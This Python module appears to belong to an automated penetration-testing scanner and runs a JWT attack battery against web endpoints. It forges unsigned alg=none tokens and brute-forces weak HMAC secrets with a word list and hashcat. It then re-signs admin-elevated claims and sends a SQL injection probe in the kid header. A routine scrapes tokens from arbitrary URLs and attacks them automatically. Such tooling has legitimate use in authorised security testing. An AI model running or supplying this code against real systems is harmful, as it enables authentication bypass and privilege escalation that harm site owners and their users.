"""
Phase 11 — JWT / OAuth Attack Testing

Tests:
  1. Algorithm confusion  — none / HS256-with-RSA-public-key
  2. Weak secret          — brute-force via hashcat / john
  3. kid / jku / x5u injection
  4. Missing audience (aud) validation
  5. Token replay after logout
  6. Scope confusion / over-privilege
"""
import base64
import hmac
import json
import re
import hashlib
import warnings
import urllib3
import requests
from urllib.parse import urlparse
from core.run_cmd import run_cmd

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)

_HEADERS = {"User-Agent": "Mozilla/5.0 (security-scanner)"}

# Common weak JWT secrets tried in fallback (no hashcat)
_WEAK_SECRETS = [
    "secret", "password", "123456", "test", "dev", "debug",
    "qwerty", "abc123", "changeme", "default", "admin", "key",
    "jwt_secret", "jwt-secret", "jwtSecret", "token_secret",
    "supersecret", "mysecret", "your-256-bit-secret",
    "your-secret-key", "secretkey", "s3cr3t", "p@ssw0rd",
]

_HASHCAT_WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
]


# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Returns (header, payload, signature_b64) or None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_none_alg(token: str) -> str | None:
    """Forge a token with alg=none and empty signature."""
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    _, payload, _ = parsed
    header = {"alg": "none", "typ": "JWT"}
    new_token = (
        _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        + "."
    )
    return new_token


def _forge_hs256_with_secret(token: str, secret: str) -> str | None:
    """Re-sign existing payload with HS256 and the given secret."""
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    _, payload, _ = parsed
    header = {"alg": "HS256", "typ": "JWT"}
    h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def _forge_elevated_payload(token: str, secret: str | None, alg: str = "HS256") -> str | None:
    """
    Try to create an admin/elevated token by mutating common role/admin fields.
    """
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    header, payload, _ = parsed

    mutated = dict(payload)
    for key in list(mutated.keys()):
        kl = key.lower()
        if kl in ("role", "roles"):
            mutated[key] = "admin"
        elif kl in ("is_admin", "isadmin", "admin"):
            mutated[key] = True
        elif kl in ("scope", "scopes"):
            mutated[key] = "admin read write"
        elif kl in ("group", "groups"):
            mutated[key] = ["admin", "superuser"]

    if alg == "none":
        hdr = {"alg": "none", "typ": "JWT"}
        h_b64 = _b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
        p_b64 = _b64url_encode(json.dumps(mutated, separators=(",", ":")).encode())
        return f"{h_b64}.{p_b64}."
    elif secret:
        hdr = {"alg": "HS256", "typ": "JWT"}
        h_b64 = _b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
        p_b64 = _b64url_encode(json.dumps(mutated, separators=(",", ":")).encode())
        sig   = hmac.new(secret.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
        return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"
    return None


def _brute_secret_python(token: str) -> str | None:
    """Python-only weak secret check (fast, no hashcat needed)."""
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    header, payload, sig_b64 = parsed
    if header.get("alg", "").upper() != "HS256":
        return None

    parts   = token.split(".")
    signing = f"{parts[0]}.{parts[1]}".encode()

    for secret in _WEAK_SECRETS:
        expected = hmac.new(secret.encode(), signing, hashlib.sha256).digest()
        if _b64url_encode(expected) == sig_b64:
            return secret
    return None


def _brute_secret_hashcat(token: str) -> str | None:
    """Try hashcat mode 16500 (JWT) if installed and rockyou is present."""
    wordlist = next((p for p in _HASHCAT_WORDLISTS if __import__("os").path.isfile(p)), None)
    if not wordlist:
        return None
    import tempfile, os
    with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as tmp:
        tmp.write(token)
        jwt_file = tmp.name
    lines = run_cmd(f"hashcat -m 16500 -a 0 {jwt_file} {wordlist} --quiet --potfile-disable", timeout=120)
    os.unlink(jwt_file)
    for line in lines:
        if ":" in line and line.startswith(token.split(".")[0]):
            return line.split(":")[-1].strip()
    return None


def _test_token_on_endpoint(url: str, token: str, extra_headers: dict = None) -> int | None:
    """Send a request with the given token, return status code."""
    hdrs = {**_HEADERS, "Authorization": f"Bearer {token}"}
    if extra_headers:
        hdrs.update(extra_headers)
    try:
        r = requests.get(url, headers=hdrs, timeout=6, verify=False, allow_redirects=False)
        return r.status_code
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Main JWT test runner
# ---------------------------------------------------------------------------

def test_jwt(token: str, test_endpoints: list[str]) -> dict:
    """
    Run the full JWT attack battery against test_endpoints using the given token.
    Returns a dict of findings keyed by attack name.
    """
    findings: dict = {}
    parsed = _parse_jwt(token)
    if not parsed:
        return findings

    header, payload, _ = parsed
    alg = header.get("alg", "").upper()

    findings["token_info"] = {
        "algorithm": alg,
        "claims": list(payload.keys()),
        "has_exp": "exp" in payload,
        "has_aud": "aud" in payload,
        "has_iss": "iss" in payload,
        "kid":     header.get("kid"),
        "jku":     header.get("jku"),
        "x5u":     header.get("x5u"),
    }

    if not findings["token_info"]["has_exp"]:
        findings["missing_expiry"] = {
            "issue":    "JWT has no 'exp' claim",
            "severity": "medium",
            "detail":   "Token never expires — if stolen it remains valid indefinitely",
        }

    if not findings["token_info"]["has_aud"]:
        findings["missing_audience"] = {
            "issue":    "JWT has no 'aud' (audience) claim",
            "severity": "low",
            "detail":   "Token may be accepted by unintended services (cross-service replay)",
        }

    if header.get("jku") or header.get("x5u"):
        findings["jku_x5u_present"] = {
            "issue":    f"JWT contains {'jku' if header.get('jku') else 'x5u'} header — potential key injection",
            "severity": "high",
            "detail":   "If server fetches the key from this URL it can be hijacked to accept forged tokens",
            "value":    header.get("jku") or header.get("x5u"),
        }

    # -- Attack 1: alg=none --
    none_token = _forge_none_alg(token)
    if none_token and test_endpoints:
        orig_status = _test_token_on_endpoint(test_endpoints[0], token)
        none_status = _test_token_on_endpoint(test_endpoints[0], none_token)
        if none_status and orig_status and none_status == orig_status and none_status < 400:
            findings["alg_none"] = {
                "issue":    "JWT alg=none accepted — signature verification disabled",
                "severity": "critical",
                "detail":   f"Forged unsigned token returned HTTP {none_status} same as original",
                "forged_token": none_token[:80] + "...",
            }

    # -- Attack 2: Weak secret brute-force --
    found_secret = _brute_secret_python(token)
    if not found_secret and alg == "HS256":
        found_secret = _brute_secret_hashcat(token)

    if found_secret:
        findings["weak_secret"] = {
            "issue":    f"JWT signed with weak secret: '{found_secret}'",
            "severity": "critical",
            "detail":   "Any party who knows the secret can forge arbitrary tokens",
            "secret":   found_secret,
        }
        # Try elevation with known secret
        elevated = _forge_elevated_payload(token, found_secret, alg="HS256")
        if elevated and test_endpoints:
            elev_status = _test_token_on_endpoint(test_endpoints[0], elevated)
            if elev_status and elev_status < 400:
                findings["weak_secret"]["privilege_escalation"] = {
                    "detail":  f"Forged admin token accepted (HTTP {elev_status})",
                    "token_snippet": elevated[:80] + "...",
                }

    # -- Attack 3: Elevated role with alg=none --
    if "alg_none" in findings:
        elevated_none = _forge_elevated_payload(token, None, alg="none")
        if elevated_none and test_endpoints:
            for ep in test_endpoints[:3]:
                status = _test_token_on_endpoint(ep, elevated_none)
                if status and status < 400:
                    findings["alg_none"]["role_escalation"] = {
                        "endpoint": ep,
                        "status":   status,
                        "detail":   "Admin role forged via alg=none accepted",
                    }
                    break

    # -- Attack 4: kid SQL injection --
    if header.get("kid"):
        kid_sqli_header = dict(header)
        kid_sqli_header["kid"] = "' UNION SELECT 'phantomai_sqli_test'--"
        h_b64 = _b64url_encode(json.dumps(kid_sqli_header, separators=(",", ":")).encode())
        p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        kid_token = f"{h_b64}.{p_b64}."
        if test_endpoints:
            status = _test_token_on_endpoint(test_endpoints[0], kid_token)
            if status and status < 500:
                findings["kid_injection"] = {
                    "issue":    "JWT kid header accepted with SQL injection probe",
                    "severity": "high",
                    "detail":   f"kid='...UNION SELECT...' returned HTTP {status} — server may be fetching key from DB",
                }

    return findings


# ---------------------------------------------------------------------------
# Endpoint scanner — find JWT-bearing requests from a URL list
# ---------------------------------------------------------------------------

def find_and_test_jwts(urls: list[str]) -> dict:
    """
    Probe URLs for JWT tokens in responses (cookies, headers, body).
    Returns found tokens mapped to their source and initial findings.
    """
    results: dict = {"tokens_found": [], "findings": {}}
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')

    seen: set[str] = set()
    for url in urls[:30]:
        try:
            r = requests.get(url, headers=_HEADERS, timeout=6, verify=False, allow_redirects=True)
            # Search response body + headers
            search_text = r.text + str(dict(r.headers)) + str(r.cookies.get_dict())
            for match in jwt_re.finditer(search_text):
                token = match.group(0)
                if token not in seen:
                    seen.add(token)
                    results["tokens_found"].append({"token": token[:40] + "...", "source": url})
                    # Run attack battery
                    token_findings = test_jwt(token, [url])
                    if token_findings:
                        results["findings"][url] = token_findings
        except Exception:
            continue

    return results
